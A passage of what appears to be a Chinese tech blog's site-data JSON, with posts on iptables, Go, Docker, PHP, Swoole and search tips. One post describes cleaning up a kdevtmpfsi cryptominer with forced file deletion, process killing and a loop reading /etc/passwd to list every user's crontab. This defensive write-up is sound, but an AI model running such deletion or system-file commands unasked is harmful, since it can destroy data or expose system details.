设置完成之后，不用重启任何服务，其防火墙规则已经刷新了（允许所有流量）。 参考链接 25 个有用的 iptables 防火墙规则 如何在Ubuntu上启动/停止iptables？ IptablesHowTo iptables - Linux","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"防火墙","slug":"防火墙","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"iptables","slug":"iptables","permalink":"https://www.0x2beace.com/tags/iptables/"}]},{"title":"Go 语言学习笔记","slug":"golang-quick-start","date":"2020-12-08T15:53:16.000Z","updated":"2020-12-09T00:16:20.213Z","comments":true,"path":"golang-quick-start/","link":"","permalink":"https://www.0x2beace.com/golang-quick-start/","excerpt":"最近开始学习Go 语言，记录一下学习笔记，具体可以访问Go 语言学习笔记","text":"最近开始学习Go 语言，记录一下学习笔记，具体可以访问Go 语言学习笔记 切片slice 的本质是一个数据结构，实现了对数组操作的封装。 go 提供了一种类似“动态数组”结构的数据类型，这种类型就是切片。 声明 12345&#x2F;&#x2F; 语法var identifier []type&#x2F;&#x2F; 声明一个为 int64 类型的切片 var slice []int64 初始化： 12345&#x2F;&#x2F; 初始化一个 int64 类型的切片array &#x3D; make ([]int64, 10)&#x2F;&#x2F; 初始化数组array &#x3D; [10] int64 &#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9&#125; 切片常见操作对元素进行添加： 12 数组和切片存在一些区别： 声明数组时，是需要指定长度，而切片不用指定长度。 初始化操作不一样。","categories":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/tags/Golang/"}]},{"title":"Docker Login 登录异常","slug":"docker-Login-login-exception","date":"2020-12-06T14:51:20.000Z","updated":"2020-12-06T14:58:27.671Z","comments":true,"path":"docker-Login-login-exception/","link":"","permalink":"https://www.0x2beace.com/docker-Login-login-exception/","excerpt":"今天刚好有空，把前天那个被挖矿病毒感染的容器给换一换。","text":"今天刚好有空，把前天那个被挖矿病毒感染的容器给换一换。 问题描述使用 docker login 登录时，总是会提示如下信息，可是我明明输入的是正确的账号密码。 1Error saving credentials: error storing credentials - err: exit status 1, out: Cannot autolaunch D-Bus without X11 $DISPLAY 因为我使用的并不是最新的 docker-ce 版，而是老版本docker.io，所以起初我是怀疑版本出现了不兼容的问题吗？ 其实不是，这是在 Ubuntu 下使用 docker 特有的 bug ，而修复办法不需要特意去卸载 docker-compose ，只要 “pass” 掉验证步骤。 问题解决最终解决步骤如下： 1. 安装 gnupg2 和 pass1sudo apt install gnupg2 pass 2. 生成密钥1$ gpg2 --full-generate-key 3. 查看密钥所在路径1$ gpg2 -k 4. 使用 pass 加载验证1$ pass init &quot;your key location path&quot; 至此就已经pass 掉了验证步骤，可以使用 docker login 正常登录了。 参考链接 Docker login 报证书存储错误的解决办法","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"记一次服务器被 kdevtmpfsi 变矿机","slug":"remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi","date":"2020-12-03T14:04:11.000Z","updated":"2020-12-06T14:51:34.359Z","comments":true,"path":"remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/","link":"","permalink":"https://www.0x2beace.com/remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/","excerpt":"昨天有台测试服务器被告知服务异常，进服务器之后才发现是因为docker 异常退出了。 \b","text":"昨天有台测试服务器被告知服务异常，进服务器之后才发现是因为docker 异常退出了。 \b 将docker 运行起来之后，发现有个不认识的进程 kdevtmpfsi 占用CPU 异常的多，Google 一下才知道，好家伙，服务器被当成矿机了。 直接 kill 并不能将其结束掉，它还有守护进程及可能存在的定时任务。 1. 首先查找文件12$ find &#x2F; -name kinsing &#x2F;&#x2F; 守护进程$ find &#x2F; -name kdevtmpfsi &#x2F;&#x2F; 挖矿进程 如果Redis 是运行在本地，上面两个文件通常是在/tmp/目录下。 如果Redis 是以容器的方式运行，则通常是在/var/lib/docker/overlay2/（容器的 /tmp/ 目录）下。 2. 将其删除1$ rm -f kinsing kdevtmpfsi 这里被感染的容器也不一定是Redis ，比如我的则是PHP，所以需要进入到被感染的容器内才能找到。 3. 干掉进程123$ ps -aux | grep kinsing$ ps -aux | grep kdevtmpfsi$ kill -9 pid 4. 查看定时任务1$ crontab -l 存在定时任务的不一定是当前用户，可以使用以下命令查找其他用户是否存在任务： 1$ for user in $(cut -f1 -d: &#x2F;etc&#x2F;passwd); do crontab -u $user -l; done 定时任务还可能存在于以下地方： /etc/crontab /var/spool/cron/ /var/spool/cron/crontabs/ 至此就完成了病毒的清理，网上千篇一律的全是这种处理方式，但这个方式并不适合我，我尝试了很多次，无论我怎么删除，病毒还是存在。 因为病毒是依赖于容器生存的，于是我便将容器停止掉，通过docker logs 实时查看容器最后10条日志： 1docker logs -f -t --tail 10 &lt;容器id&#x2F;容器名称&gt; 十分钟之后，总算让我逮到了： 虽然目睹了全过程，但这时我依然无能为力，因为我不知道上面那些命令是如何自动启动的。 尝试了各种方式，但都无解，十分钟之后病毒还是会出来，最终我只能把这个被感染的容器给弃用了，重新起一个新的容器。 总结kdevtmpfsi病毒的产生，通常是因为Redis 对外开放 6379端口，且没设置密码或者密码过于简单导致。 所以服务器一定要设置好防火墙，像3306、6379 这种常用端口，尽量减少对外开放的机会。 参考链接 Linux.Packed.753","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"PHP-FPM 进化史","slug":"the-evolution-of-php-fpm","date":"2020-12-02T13:42:16.000Z","updated":"2021-01-03T08:14:50.203Z","comments":true,"path":"the-evolution-of-php-fpm/","link":"","permalink":"https://www.0x2beace.com/the-evolution-of-php-fpm/","excerpt":"最近有幸读到一篇文章，一文将CGI 的进化史讲的特别详细，虽然我自己之前也整理过 CGI、FastCGI、PHP-FPM 相关的笔记，但是并没有从原理的角度来认识 CGI。","text":"最近有幸读到一篇文章，一文将CGI 的进化史讲的特别详细，虽然我自己之前也整理过 CGI、FastCGI、PHP-FPM 相关的笔记，但是并没有从原理的角度来认识 CGI。 CGI 的诞生早些年的Web 应用很简单，客户端通过浏览器发起请求，服务端直接返回响应。 随着互联网的发展，简单的Web 应用已经不能满足开发者们了。我们希望Web服务器有更多的功能，飞速发展的同时还能让不同语言的开发者也能加入。 CGI协议协议的诞生就是 Web服务器和其他领域的开发者在保证遵守协议的基础上，剩下的可以自由发挥，而实现这个协议的脚本叫做CGI 程序。 CGI协议规定了需要向CGI脚本设置的环境变量和一些其他信息，CGI程序完成某一个功能，可以用PHP，Python，Shell或者C语言编写。 在没有CGI 之前，其他语言如果需要接入Mysql 或者Memcache，还需要使用C 语言，但有了CGI协议，我们的Web处理流程可以变成下图这样： FastCGI 的诞生CGI程序存在致命的缺点：每当客户端发起请求，服务器将请求转发给CGI，WEB 服务器就请求操作系统生成一个新的CGI解释器进程(如php-cgi），CGI进程则处理完一个请求后退出，下一个请求来时再创建新进程。 我们知道，执行一个PHP程序的必须要先解析php.ini文件，然后模块初始化等等一系列工作，每次都反复这样非常浪费资源。 FastCGI协议在CGI协议的基础上，做出了如下改变： FastCGI被设计用来支持常驻（long-lived）应用进程，减少了fork-and-execute带来的开销 FastCGI进程通过监听的socket，收来自Web服务器的连接，这样FastCGI 进程可以独立部署 服务器和FastCGI监听的socket 之间按照消息的形式发送环境变量和其他数据 我们称实现了FastCGI协议的程序为FastCGI程序，FastCGI程序的交互方式如下图所示： PHP-FPM 的诞生FastCGI 程序固然已经很好了，但我们的需求总是有点苛刻，它还是存在一些明显缺点的： 当我们更改配置文件(php.ini)后，php-cgi（FastCGI 程序） 无法平滑重启 我们fork的进程个数和请求量正比，请求繁忙时 fork 进程多，动态调整 php-cgi还没做到 上面提及php-cgi 实现的FastCGI问题官方没有解决，幸运的是有第三方帮我们解决了，它就是 php-fpm。 它可以独立运行，不依赖php-cgi，换句话说，它自己实现了FastCGI协议并且支持进程平滑重启且带进程管理功能。 进程包含 master 进程和 worker 进程两类进程。 master 进程只有一个，负责监听端口，接收来自Web Server 的请求，而 worker 进程则一般有多个（具体数量根据实际需要配置），每个进程内部都嵌入了一个PHP 解释器，是PHP 代码正真执行的地方。 参考链接 从CGI到FastCGI到PHP-FPM","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"PHP 8.0 初体验","slug":"php-8-0-first-experience","date":"2020-12-01T13:09:15.000Z","updated":"2020-12-02T00:03:35.910Z","comments":true,"path":"php-8-0-first-experience/","link":"","permalink":"https://www.0x2beace.com/php-8-0-first-experience/","excerpt":"昨天使用 homebrew 安装软件时，结果把我本地已安装的软件中能更新的全部给更新了一遍。","text":"昨天使用 homebrew 安装软件时，结果把我本地已安装的软件中能更新的全部给更新了一遍。 这其中就包括 php8.0。在8.0 正式出来之前，有听说过加入了新特性：JIT编译。 从理论上讲，JIT处理PHP脚本编译的方式能够提高应用程序的速度，但究竟能有多快呢？下面通过一个简单的例子来看看。 123456789101112131415161718&lt;?php$startTime &#x3D; microtime(true);$mysqli &#x3D; new Mysqli(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;);function doSomething($db,$i)&#123; $hash &#x3D; md5($i); $db-&gt;query(&quot;INSERT INTO local.test(id, hash) VALUES($i, \\&quot;$hash\\&quot;)&quot;);&#125;$i &#x3D; 1;while ($i&lt;100000) &#123; doSomething($mysqli, $i); $i++;&#125;$total &#x3D; microtime(true) - $startTime;var_dump(&quot;总耗时：&#123;$total&#125;秒&quot;); 这里只是简单的向数据库不重复插入十万条数据。我知道用这个脚本举例子并不好，但它却是离我日常使用最近的。 php7.3 测试结果： php8.0 未开启 JIT 扩展测试结果： php8.0 已开启 JIT 扩展测试结果： 可以看到相比 7.3，足足快了近三分之一！ 当然这个测试结果严格意义上来讲，并不准确，但看到数字从四十多秒缩短到三十秒，还是很惊喜的。 我的电脑配置： 3.5 GHz 双核Intel Core i7 16 GB RAM","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"记一次 Linux 服务器性能调优","slug":"remember-a-Linux-server-performance-tuning","date":"2020-11-30T15:45:09.000Z","updated":"2020-12-06T14:52:17.447Z","comments":true,"path":"remember-a-Linux-server-performance-tuning/","link":"","permalink":"https://www.0x2beace.com/remember-a-Linux-server-performance-tuning/","excerpt":"轮询查 Db 对服务器（数据库）的压力究竟有多大？","text":"轮询查 Db 对服务器（数据库）的压力究竟有多大？ 前段时间接手一个老系统，其中对于“订单”的处理，非常原始且简单粗暴。 直接通过一个 PHP 脚本不断轮询查询数据库，直到查找到需要处理的“订单”才去处理，否则一直查找。 12345678910111213&lt;?phpfunction doSomething()&#123; &#x2F;&#x2F; 查询数据库 if ($exists)&#123; &#x2F;&#x2F; todo ... &#125;&#125;while(true)&#123; doSomething();&#125; 类似的处理还有其他几个脚本。 因为项目的历史包袱较重，也不好做一些大调整，起初我并没有太在意，就直接部署到服务器上了。 就在最近，我收到反馈，系统有问题。通过一系列排查最后发现是因为“订单”处理不及时，“订单”堆积过多导致的一系列问题。 我寻思着，用户量也没有很多，为什么会处理不完呢？使用 glances 命令看了一眼。 这不看不知道，一看吓一跳，CPU 直接警告了。无论多好的机器也经受不住这样折腾，赶紧把轮询查表的方式改成了查队列。 基于Redis 的List 实现一个简单的消息队列，更新到服务器之后，可以看到CPU 直接降了一半。 为什么使用Redis 会比Mysql 的效果要好？ 通俗一点解释是因为Redis 存储是基于内存，Mysql 存储是基于磁盘，而内存的读写要比磁盘快不止一个数量级。 当然，上面的处理方式并不是最优的，这里只是单论如何发现性能瓶颈，以及如何调优这一点来进行说明。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"PHP","slug":"Linux/PHP","permalink":"https://www.0x2beace.com/categories/Linux/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Swoole 协程学习","slug":"swoole-coroutine-learning","date":"2020-11-29T14:36:47.000Z","updated":"2020-11-29T14:37:50.672Z","comments":true,"path":"swoole-coroutine-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-coroutine-learning/","excerpt":"第一次接触协程这个概念，是在学习Swoole时，那时看官方文档并不能完全理解协程到底是个什么东西以及该如何正确的使用它。","text":"第一次接触协程这个概念，是在学习Swoole时，那时看官方文档并不能完全理解协程到底是个什么东西以及该如何正确的使用它。 后来逐渐看了一些写的比较通俗的文章，加上自己的一些理解，逐步开始对协程有一些认识了。 认识协程协程不是进程或线程，其执行过程更类似于子例程，或者说不带返回值的函数调用。 上面那句话很关键，一句话就把协程是什么，不是什么说清楚了。 下面这张图可以很清晰的看到协程与多进程的区别： 执行顺序下面这段代码主要做了三件事：写入文件、发送邮件以及插入数据。 12345678910111213141516171819202122232425&lt;?phpfunction task1()&#123; for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123; &#x2F;&#x2F;写入文件,大概要3000微秒 usleep(3000); echo &quot;写入文件&#123;$i&#125;\\n&quot;; &#125;&#125;function task2()&#123; for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123; &#x2F;&#x2F;发送邮件给500名会员,大概3000微秒 usleep(3000); echo &quot;发送邮件&#123;$i&#125;\\n&quot;; &#125;&#125;function task3()&#123; for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; &#x2F;&#x2F;模拟插入100条数据,大概3000微秒 usleep(3000); echo &quot;插入数据&#123;$i&#125;\\n&quot;; &#125;&#125;task1();task2();task3(); 这段代码和上面不同的是，这三件事情是交叉执行的，每个任务执行完一次之后，切换到另一个任务，如此循环。 类似于这样的执行顺序，就是协程。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpfunction task1($i)&#123; &#x2F;&#x2F;使用$i标识 写入文件,大概要3000微秒 if ($i &gt; 300) &#123; return false;&#x2F;&#x2F;超过300不用写了 &#125; echo &quot;写入文件&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;function task2($i)&#123; &#x2F;&#x2F;使用$i标识 发送邮件,大概要3000微秒 if ($i &gt; 500) &#123; return false;&#x2F;&#x2F;超过500不用发送了 &#125; echo &quot;发送邮件&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;function task3($i)&#123; &#x2F;&#x2F;使用$i标识 插入数据,大概要3000微秒 if ($i &gt; 100) &#123; return false;&#x2F;&#x2F;超过100不用插入 &#125; echo &quot;插入数据&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;$i &#x3D; 0;while (true) &#123; $task1Result &#x3D; task1($i); $task2Result &#x3D; task2($i); $task3Result &#x3D; task3($i); if($task1Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task2Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task3Result&#x3D;&#x3D;&#x3D;false)&#123; break;&#x2F;&#x2F;全部任务完成,退出循环 &#125; $i++;&#125; swoole实现协程代码： 12345678910111213141516171819202122232425262728&lt;?phpfunction task1()&#123; for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123; &#x2F;&#x2F;写入文件,大概要3000微秒 usleep(3000); echo &quot;写入文件&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程 &#125;&#125;function task2()&#123; for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123; &#x2F;&#x2F;发送邮件给500名会员,大概3000微秒 usleep(3000); echo &quot;发送邮件&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程 &#125;&#125;function task3()&#123; for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; &#x2F;&#x2F;模拟插入100条数据,大概3000微秒 usleep(3000); echo &quot;插入数据&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程 &#125;&#125;$pid1 &#x3D; go(&#39;task1&#39;);&#x2F;&#x2F;go函数是swoole的开启协程函数，用于开启一个协程$pid2 &#x3D; go(&#39;task2&#39;);$pid3 &#x3D; go(&#39;task3&#39;); 协程与多进程由上面的代码，可以发现，协程其实只是运行在一个进程中的函数，只是这个函数会被切换到下一个执行。 需要注意的是⚠️： 协程并不是多任务并行处理，它属于多任务串行处理，它俩的本质区别是在某个时刻同时执行一个还是多个任务。 协程的作用域由于协程就是进程中一串任务代码，所以它的全局变量、静态变量等变量都是共享的，包括 PHP 的全局缓冲区。 所以在开发时特别需要注意作用域相关的问题。 协程的I/O连接在协程中，要特别注意不能共用一个 I/O 连接，否则会造成数据异常。 由于协程的交叉运行机制，且各个协程的 I/O 连接都必须是相互独立的，这时如果使用传统的直接建立连接方式，会导致每个协程都需要建立连接、闭关连接，从而消耗大量资源。那么该如何解决协程的 I/O 连接问题呢？这个时候就需要用到连接池了。 连接池存在的意义在于，复用原来的连接，从而节省重复建立连接所带来的开销。 协程的实际应用场景说了这么多，那协程倒底能解决哪些实际业务场景呢？下面通过一个实例来快速上手协程（笔者当时写这篇文章时，对协程的理解还不够深刻，所以这里引用zxr615 的”做饭“的例子来理解协程）： 传统同步阻塞实现逻辑： 12345678910111213141516171819202122232425&lt;?phpfunction cook()&#123; $startTime &#x3D; time(); echo &quot;开始煲汤...&quot; . PHP_EOL; sleep(10); echo &quot;汤好了...&quot; . PHP_EOL; echo &quot;开始煮饭...&quot; . PHP_EOL; sleep(8); echo &quot;饭熟了...&quot; . PHP_EOL; echo &quot;放油...&quot; . PHP_EOL; sleep(1); echo &quot;煎鱼...&quot; . PHP_EOL; sleep(3); echo &quot;放盐...&quot; . PHP_EOL; sleep(1); echo &quot;出锅...&quot; . PHP_EOL; var_dump(&#39;总耗时：&#39; . (time() - $startTime) . &#39; 分钟&#39;);&#125;cook(); 协程实现逻辑： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?phpuse Swoole\\Coroutine;use Swoole\\Coroutine\\WaitGroup;use Swoole;class Cook&#123; public function cookByCo() &#123; $startTime &#x3D; time(); &#x2F;&#x2F; 开启一键协程化: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;runtime?id&#x3D;swoole_hook_all Swoole\\Runtime::enableCoroutine($flags &#x3D; SWOOLE_HOOK_ALL); &#x2F;&#x2F; 创建一个协程容器: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;scheduler &#x2F;&#x2F; 相当于进入厨房 \\Co\\run(function () &#123; &#x2F;&#x2F; 等待结果: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;wait_group?id&#x3D;waitgroup &#x2F;&#x2F; 记录哪道菜做好了，哪道菜还需要多长时间 $wg &#x3D; new WaitGroup(); &#x2F;&#x2F; 保存数据的结果 &#x2F;&#x2F; 装好的菜 $result &#x3D; []; &#x2F;&#x2F; 记录一下煲汤(记录一个任务) $wg-&gt;add(); &#x2F;&#x2F; 创建一个煲汤任务(开启一个新的协程) Coroutine::create(function () use ($wg, &amp;$result) &#123; echo &quot;开始煲汤...&quot; . PHP_EOL; &#x2F;&#x2F; 煲汤需要6分钟，所以我们也不用在这里等汤煮好， &#x2F;&#x2F; 直接去做下一个任务：炒菜(协程切换) sleep(8); echo &quot;汤好了...&quot; . PHP_EOL; &#x2F;&#x2F; 装盘 $result[&#39;soup&#39;] &#x3D; &#39;一锅汤&#39;; $wg-&gt;done(); &#x2F;&#x2F; 标记任务完成 &#125;); &#x2F;&#x2F; 记录一下煮饭(记录一个任务) $wg-&gt;add(); &#x2F;&#x2F; 创建一个煮饭任务(开启一个新的协程) Coroutine::create(function () use ($wg, &amp;$result) &#123; echo &quot;开始煮饭...&quot; . PHP_EOL; &#x2F;&#x2F; 煮饭需要5分钟，所以我们不用在这里等饭煮熟，放在这里一会再来看看好了没有 &#x2F;&#x2F; 我们先去煲汤(协程切换) sleep(10); echo &quot;饭熟了...&quot; . PHP_EOL; &#x2F;&#x2F; 装盘 $result[&#39;rice&#39;] &#x3D; &#39;一锅米饭&#39;; $wg-&gt;done(); &#x2F;&#x2F; 标记任务完成 &#125;); &#x2F;&#x2F; 记录一下炒菜 $wg-&gt;add(); &#x2F;&#x2F; 创建一个炒菜任务(再开启一个新的协程) Coroutine::create(function () use ($wg, &amp;$result) &#123; &#x2F;&#x2F; 煎鱼的过程必须放在一个协程里面执行，如果不是的话可能鱼还没煎好就出锅了 &#x2F;&#x2F; 因为开启协程后，IO全是异步了，在此demo中每次遇到sleep都会挂起当前协程 &#x2F;&#x2F; 切换到下一个协程执行。 &#x2F;&#x2F; 例如把出锅这一步开启一个新协程执行，则在煎鱼的时候鱼，鱼就出锅了。 echo &quot;放油...&quot; . PHP_EOL; sleep(1); echo &quot;煎鱼...&quot; . PHP_EOL; sleep(3); echo &quot;放盐...&quot; . PHP_EOL; sleep(1); echo &quot;出锅...&quot; . PHP_EOL; &#x2F;&#x2F; 装盘 $result[&#39;food&#39;] &#x3D; &#39;鱼香肉丝&#39;; $wg-&gt;done(); &#125;); &#x2F;&#x2F; 等待全部任务完成 $wg-&gt;wait(); &#x2F;&#x2F; 返回数据(上菜！) var_dump($result); &#125;); var_dump(&#39;总耗时：&#39; . (time() - $startTime) . &#39; 分钟&#39;); &#125;&#125;$cooker &#x3D; new Cook();$cooker-&gt;cookByCo(); 通过执行代码可以看到协程方式比传统阻塞方式足足快了十三分钟。从协程方式实现的逻辑中可以看到，通过无感知编写”同步代码“，却实现了异步 I/O 的效果和性能。避免了传统异步回调所带来的离散的代码逻辑和陷入多层回调中导致代码无法维护。 不过需要注意的是传统回调的触发条件是回调函数，而协程切换的条件是遇到 I/O。 协程误区实际使用协程时，需要注意以下几个误区，否则效果可能会事倍功半。 理论上来讲，协程解决的是 I/O 复用的问题，对于计算密集的问题无效。 如果cpu很闲(大部分时间都消耗在网络磁盘上了)，协程就可以提高cpu的利用率 如果cpu本身就很饱和了 用协程反而会降低cpu利用率（需要花时间来做协程调度）。 swoole 是单线程 参考链接 swoole 学习笔记-做一顿饭来理解协程 协程-EasySwoole swoole 协程-swoole 高手之路 swoole一个协程问题？为什么效率变慢了","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"如何高效的利用谷歌搜索引擎","slug":"how-to-use-google-search-engine-efficiently","date":"2020-11-28T09:03:14.000Z","updated":"2020-11-28T09:04:27.083Z","comments":true,"path":"how-to-use-google-search-engine-efficiently/","link":"","permalink":"https://www.0x2beace.com/how-to-use-google-search-engine-efficiently/","excerpt":"整理这篇笔记的目的是整理那些不太常用但又十分有用的Google 搜索引擎搜索技巧。","text":"整理这篇笔记的目的是整理那些不太常用但又十分有用的Google 搜索引擎搜索技巧。 搜索完全匹配的搜索结果有时候我们会有这样一种需求：我需要查找某个关键字同时出现的内容，该怎么做呢？这个时候就需要用到完全匹配这招了。 在关键字的左右两边分别加上&quot;英文状态的双引号，如： 1&quot;HHKB 是什么&quot; 从搜索结果中排除特定词为了进一步筛选搜索结果，还需要学会另一招，利用-减号排除特定关键字： 1&quot;the most important benefit of education&quot;-&quot;unitedstates&quot; 上面这段表示的意思是：要求Google 返回含有”the most important benefit of education” 但不存在”unitedstates”的内容。 1daddy -film daddy 的意思是父亲，同时也是一部电影，当你搜索”daddy” 时，谷歌只返回有关电影的内容。如果你只想搜索时关于父亲，要排除电影，在需要排除的前面加上-，例如上面所示。你会发现结果中没有与电影有关的内容。 搜索通配符或未知字词怎样用？ 即搜索字符串中可以包含星号*，用星号来替代任意字符串。 1powerful*life 搜索社交媒体当你只想在某个社交媒体里找到相关字词时，在用于搜索社交媒体的字词前加上@，例如： 1@twice 组合搜索在各个搜索查询字间加上“OR”关键字，例如： 1race OR marathon 搜索到的结果会返回关于 race 或者 marathon，或两者均有的相关内容。 搜索特定价格用这个方法来搜索特定价格的商品，例如想要搜索价格为$200的书包，可以这样搜索： 1$200 bag 在某个数字范围内执行搜索比如想要搜索介于 $100 - $200 之间的商品，或者是 10kg - 20kg 的某种东西，亦或者是 1900 - 1945 年发生的事情，等等。 在两个数字之间加上..符号，例如搜索价格 $50 - $100 的桌子： 1amazon table $50..$100 搜索特定网站只在特定的网站里搜索相关资料，在相应的域名前面加上&quot;site:&quot;，例如要在 youtube 里找关于猫的电影，可以这样搜索： 1site:youtube.com cat 搜索相关网站想找和某个网站有关系或者相似特质的网站，在已知网址前面加上related:，例如： 1related:google.com google.com 是一个搜索网站，加上related:关键字之后，搜索的结果是其他搜索引擎，如 Yahoo、Bing 等 寻找主题标记在关键字前面加上#符号， 获取网站的相关资料如果你想知道某个网站是关于什么的，可以这样子搜索： 1info:baidu.com 多组合运用 在 channelnewsasia.com 网站里搜索关于天灾的意外，除了地震，发生在2012年到2016年之间。 1site:channelnewsasia.com ~accident &quot;natural disaster&quot; -earthquake 2012..2016 其中波浪符号~表示也搜索和这个字有关联的内容，如 failure，crash、mishap 等 从两个购物网站搜索手表，价格在 $100 到 $200 之间 1site:shopee.com.my OR site:amazon.com watch $100..$200 从ebay 与 amazon网站搜索苹果与微软的产品，排除平板电脑 1site:ebay.com OR site:amazon.com apple OR microsoft -tablet 在吉隆坡一带搜索低收费住宿，价格在$100 到 $200 之间，排除 airbnb，靠近轻快地铁 1KL ~budget~accommodation $100..$200 -airbnb &quot;nearby LRT station&quot;","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Google Search","slug":"Google-Search","permalink":"https://www.0x2beace.com/tags/Google-Search/"}]},{"title":"PHP + Swoole 实现异步任务队列","slug":"php-swoole-to-achieve-asynchronous-task-queue","date":"2020-11-26T12:33:48.000Z","updated":"2020-11-27T13:54:36.939Z","comments":true,"path":"php-swoole-to-achieve-asynchronous-task-queue/","link":"","permalink":"https://www.0x2beace.com/php-swoole-to-achieve-asynchronous-task-queue/","excerpt":"最近接手一个对接短信的需求，这个需求本身并没有什么难度，直接按照服务商的要求请求具体的接口就好了。","text":"最近接手一个对接短信的需求，这个需求本身并没有什么难度，直接按照服务商的要求请求具体的接口就好了。 最开始是使用传统的同步阻塞方式实现了一遍，用户体验并不好，发送短信需要等待，等待服务商的接口返回内容，才继续向下执行。 因为最近在学习Swoole，Swoole 中有一个“异步任务”，就特别适合以下应用场景： 需要执行耗时操作，会阻塞主进程 用户不需要等待返回结果 结合官网手册和Latent 的基于 swoole 下 异步消息队列 API，最终简单封装了一个处理API 的类，实现如下： 服务端服务端是基于本地Tcp，监听9501端口。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162&lt;?phpclass taskServer&#123; const HOST &#x3D; &quot;127.0.0.1&quot;; const PORT &#x3D; 9501; public $server &#x3D; null; public function __construct() &#123; $this-&gt;server &#x3D; new SWoole\\Server(self::HOST, self::PORT); $this-&gt;server-&gt;set(array( &quot;enable_coroutine&quot; &#x3D;&gt; false, &#x2F;&#x2F; 关闭协程 &quot;worker_num&quot; &#x3D;&gt; 2, &#x2F;&#x2F; 开启的进程数 一般为cup核数 1-4 倍 &quot;task_worker_num&quot; &#x3D;&gt; 2, &#x2F;&#x2F; task进程的数量 &#39;daemonize&#39; &#x3D;&gt; true, &#x2F;&#x2F; 以守护进程的方式启动 )); &#x2F;&#x2F; 注册事件 $this-&gt;server-&gt;on(&quot;connect&quot;, [$this, &quot;onConnect&quot;]); $this-&gt;server-&gt;on(&quot;receive&quot;, [$this, &quot;onReceive&quot;]); $this-&gt;server-&gt;on(&quot;close&quot;, [$this, &quot;onClose&quot;]); $this-&gt;server-&gt;on(&quot;task&quot;, [$this, &quot;onTask&quot;]); 